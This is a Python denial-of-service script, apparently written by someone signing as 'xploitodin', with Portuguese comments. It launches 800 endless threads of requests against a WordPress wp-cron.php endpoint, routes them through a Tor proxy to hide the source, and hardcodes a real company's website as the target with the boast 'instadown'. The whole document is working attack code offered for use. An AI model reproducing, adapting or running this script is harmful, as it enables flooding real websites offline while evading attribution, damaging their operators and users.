import requests
import threading
import time
import random

class WPDoS:
    def __init__(self, target, threads):
        self.target = target
        self.threads = threads

    def attack(self):
        def thread_task():
            while True:
                try:
                    # coded by xploitodin Configura o proxy do Tor
                    proxies = {
                        "http": "socks5h://127.0.0.1:9050",
                        "https": "socks5h://127.0.0.1:9050",
                    }
                    response = requests.get(
                        self.target,
                        proxies=proxies,
                        timeout=5
                    )
                    print(f"Thread {threading.current_thread().name} enviou requisição para {self.target}. Status: {response.status_code}")
                except requests.RequestException as e:
                    print(f"Thread {threading.current_thread().name} encontrou um erro: {e}")
                time.sleep(random.uniform(1, 3))  # time

        for _ in range(self.threads):
            thread = threading.Thread(target=thread_task)
            thread.start()

if __name__ == "__main__":
    target = "https://www.battleye.com/wp-cron.php"  # URL
    threads = 800  # threads (800) instadown

    wp_dos = WPDoS(target, threads)
    wp_dos.attack()
